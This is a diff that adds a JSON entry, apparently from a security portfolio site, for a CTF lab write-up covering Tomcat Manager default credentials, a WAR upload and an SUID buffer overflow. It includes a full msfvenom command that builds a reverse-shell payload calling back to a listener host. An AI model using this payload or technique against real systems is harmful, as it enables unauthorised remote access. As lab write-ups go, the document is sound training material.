@@ -1,0 +1,14 @@
+{
+    "id": "ctf-ghost-in-the-shell",
+    "title": "CTF: Ghost in the Shell",
+    "description": "A high-stakes CTF challenge involving multi-stage exploitation, network pivoting, and a custom kernel exploit to retrieve the final flag.",
+    "techStack": [
+        "Metasploit",
+        "Wireshark",
+        "Binary Ninja",
+        "Python"
+    ],
+    "securityLevel": "TOP SECRET",
+    "fullDescription": "This lab simulated a corporate environment with multiple layers of defense. The objective was to breach the external perimeter, pivot through the internal network, and gain root access on the core database server.",
+    "writeup": "# CTF Writeup: Ghost in the Shell\n\n## 1. Reconnaissance\nThe first step involved a targeted **nmap scan** of the network range. One specific host `10.0.0.45` stood out with an open port `8080` running an outdated version of *Apache Tomcat*.\n\n```bash\nnmap -sV -p 8080 10.0.0.45\n# Output: Apache Tomcat/7.0.88\n```\n\n## 2. Foothold\nI leveraged a known **Manager App** vulnerability using default credentials discovered during directory brute-forcing. This allowed me to upload a malicious **WAR file** to gain a reverse shell.\n\n*   **Tool used**: `msfvenom` for shell generation.\n*   **Vulnerability**: Improper access control on `/manager/html`.\n\n```bash\nmsfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.5 LPORT=4444 -f war > exploit.war\n```\n\n## 3. Privilege Escalation\nOnce inside, I discovered a custom binary with the **SUID bit** set. Using **Binary Ninja**, I identified a buffer overflow condition in the way the binary handled environment variables.\n\n### The Exploit\nThe final exploit required a precise **ROP chain** to bypass **NX/DEP** constraints.\n\n> \"The shell is thin, but the ghost is strong.\"\n\n## 4. Conclusion\nRetrieved the flag from `/root/flag.txt`: `GH0ST{K3RN3L_P4NIC_SUCC3SS}`. This challenge emphasized the importance of **least privilege** and **patch management**."
+}
